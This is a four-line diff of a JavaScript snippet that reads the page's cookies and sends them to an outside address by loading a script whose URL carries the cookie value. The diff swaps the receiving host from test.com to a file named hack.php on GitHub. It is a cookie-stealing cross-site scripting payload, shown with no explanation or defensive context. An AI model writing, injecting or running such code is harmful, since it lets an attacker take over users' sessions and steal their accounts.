@@ -1,4 +1,4 @@
 var c=document.cookie;
 var script =document.createElement('script');
-script.src='http://test.com/index.php?c='+c;
+script.src='https://github.com/Alexandermclean/web_doc/blob/master/hack.php?c='+c;
 document.body.appendChild(script);
